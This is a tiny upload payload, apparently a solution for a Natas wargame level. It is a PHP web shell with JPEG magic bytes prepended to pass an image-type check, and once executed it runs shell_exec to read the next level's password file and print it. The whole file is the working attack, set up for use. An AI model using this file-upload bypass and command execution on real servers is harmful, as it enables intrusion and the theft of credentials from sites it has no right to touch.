ÿØÿÛÃ
<html> 
    <head> </head>
    <body>
        <b>ciao</b><br>
        <?php 
            echo "ciao da questo exploit!<br>"; 
            $output = shell_exec('cat /etc/natas_webpass/natas14');
            echo $output."<br>";
        ?>

    </body>
